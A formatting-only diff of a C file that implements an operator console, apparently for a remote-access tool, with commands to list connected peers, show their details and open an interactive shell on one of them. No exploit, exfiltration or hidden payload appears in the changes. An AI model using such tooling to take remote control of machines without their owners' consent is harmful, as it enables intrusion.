@@ -1,17 +1,19 @@
-#include <setjmp.h>
+#include "scmd.h"
 
+#include "lerror.h"
 #include "lmem.h"
 #include "sclient.h"
 #include "speer.h"
-#include "scmd.h"
 #include "sterm.h"
-#include "lerror.h"
 
-#define CMD_ERROR(...) do { \
-    PRINTTAG(TERM_BRIGHT_RED); \
-    shellT_printf(__VA_ARGS__); \
-    longjmp(cmdE_err, 1); \
-} while(0);
+#include <setjmp.h>
+
+#define CMD_ERROR(...)                                                                             \
+    do {                                                                                           \
+        PRINTTAG(TERM_BRIGHT_RED);                                                                 \
+        shellT_printf(__VA_ARGS__);                                                                \
+        longjmp(cmdE_err, 1);                                                                      \
+    } while (0);
 
 jmp_buf cmdE_err;
 
@@ -19,14 +21,16 @@ jmp_buf cmdE_err;
 
 tShell_cmdDef *shellS_findCmd(char *cmd);
 
-tShell_peer *shellS_getPeer(tShell_client *client, int id) {
+tShell_peer *shellS_getPeer(tShell_client *client, int id)
+{
     if (id < 0 || id >= client->peerTblCount || client->peerTbl[id] == NULL)
         CMD_ERROR("Not a valid peer ID! [%d]\n", id);
 
     return client->peerTbl[id];
 }
 
-int shellS_readInt(char *str) {
+int shellS_readInt(char *str)
+{
     return atoi(str);
 }
 
@@ -34,12 +38,14 @@ int shellS_readInt(char *str) {
 
 void helpCMD(tShell_client *client, int argc, char *argv[]);
 
-void quitCMD(tShell_client *client, int argc, char *argv[]) {
+void quitCMD(tShell_client *client, int argc, char *argv[])
+{
     PRINTINFO("Killing socket...\n");
     laikaS_kill(&client->peer->sock);
 }
 
-void listPeersCMD(tShell_client *client, int argc, char *argv[]) {
+void listPeersCMD(tShell_client *client, int argc, char *argv[])
+{
     int i;
 
     for (i = 0; i < client->peerTblCount; i++) {
@@ -50,7 +56,8 @@ void listPeersCMD(tShell_client *client, int argc, char *argv[]) {
     }
 }
 
-void infoCMD(tShell_client *client, int argc, char *argv[]) {
+void infoCMD(tShell_client *client, int argc, char *argv[])
+{
     tShell_peer *peer;
     int id;
 
@@ -65,7 +72,8 @@ void infoCMD(tShell_client *client, int argc, char *argv[]) {
     shellP_printInfo(peer);
 }
 
-void openShellCMD(tShell_client *client, int argc, char *argv[]) {
+void openShellCMD(tShell_client *client, int argc, char *argv[])
+{
     uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
     tShell_peer *peer;
     int id, sz, cols, rows;
@@ -112,7 +120,8 @@ void openShellCMD(tShell_client *client, int argc, char *argv[]) {
 
 /* =====================================[[ Command Table ]]===================================== */
 
-#define CREATECMD(_cmd, _syntax, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .syntax = _syntax, .help = _help, .callback = _callback})
+#define CREATECMD(_cmd, _syntax, _help, _callback)                                                 \
+    ((tShell_cmdDef){.cmd = _cmd, .syntax = _syntax, .help = _help, .callback = _callback})
 
 tShell_cmdDef shellS_cmds[] = {
     CREATECMD("help", "help", "Lists avaliable commands", helpCMD),
@@ -124,11 +133,12 @@ tShell_cmdDef shellS_cmds[] = {
 
 #undef CREATECMD
 
-tShell_cmdDef *shellS_findCmd(char *cmd) {
+tShell_cmdDef *shellS_findCmd(char *cmd)
+{
     int i;
 
     /* TODO: make a hashmap for command lookup */
-    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
+    for (i = 0; i < (sizeof(shellS_cmds) / sizeof(tShell_cmdDef)); i++) {
         if (strcmp(shellS_cmds[i].cmd, cmd) == 0)
             return &shellS_cmds[i]; /* cmd found */
     }
@@ -136,24 +146,32 @@ tShell_cmdDef *shellS_findCmd(char *cmd) {
     return NULL;
 }
 
-void helpCMD(tShell_client *client, int argc, char *argv[]) {
+void helpCMD(tShell_client *client, int argc, char *argv[])
+{
     int i;
 
-    shellT_printf("======= [[ %sCommand List%s ]] =======\n", shellT_getForeColor(TERM_BRIGHT_YELLOW), shellT_getForeColor(TERM_BRIGHT_WHITE));
-    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
-        shellT_printf("'%s%s%s'\t- %s\n", shellT_getForeColor(TERM_BRIGHT_YELLOW), shellS_cmds[i].syntax, shellT_getForeColor(TERM_BRIGHT_WHITE), shellS_cmds[i].help);
+    shellT_printf("======= [[ %sCommand List%s ]] =======\n",
+                  shellT_getForeColor(TERM_BRIGHT_YELLOW), shellT_getForeColor(TERM_BRIGHT_WHITE));
+
+    for (i = 0; i < (sizeof(shellS_cmds) / sizeof(tShell_cmdDef)); i++) {
+        shellT_printf("'%s%s%s'\t- %s\n", shellT_getForeColor(TERM_BRIGHT_YELLOW),
+                      shellS_cmds[i].syntax, shellT_getForeColor(TERM_BRIGHT_WHITE),
+                      shellS_cmds[i].help);
     }
 }
 
-void shellS_initCmds(void) {
+void shellS_initCmds(void)
+{
     /* stubbed for now, TODO: setup command hashmap */
 }
 
-void shellS_cleanupCmds(void) {
+void shellS_cleanupCmds(void)
+{
     /* stubbed for now, TODO: free command hashmap */
 }
 
-char **shellS_splitCmd(char *cmd, int *argSize) {
+char **shellS_splitCmd(char *cmd, int *argSize)
+{
     int argCount = 0;
     int argCap = 4;
     char *temp;
@@ -165,7 +183,7 @@ char **shellS_splitCmd(char *cmd, int *argSize) {
         if (arg != cmd) {
             if (arg[-1] == '\\') { /* space is part of the argument */
                 /* remove the '\' character */
-                for (temp = arg-1; *temp != '\0'; temp++) {
+                for (temp = arg - 1; *temp != '\0'; temp++) {
                     temp[0] = temp[1];
                 }
                 arg++;
@@ -175,7 +193,7 @@ char **shellS_splitCmd(char *cmd, int *argSize) {
         }
 
         /* insert into our 'args' array */
-        laikaM_growarray(char*, args, 1, argCount, argCap);
+        laikaM_growarray(char *, args, 1, argCount, argCap);
         args[argCount++] = arg;
     } while ((arg = strchr(arg, ' ')) != NULL); /* while we still have a delimiter */
 
@@ -183,7 +201,8 @@ char **shellS_splitCmd(char *cmd, int *argSize) {
     return args;
 }
 
-void shellS_runCmd(tShell_client *client, char *cmd) {
+void shellS_runCmd(tShell_client *client, char *cmd)
+{
     tShell_cmdDef *cmdDef;
     char **argc;
     int args;
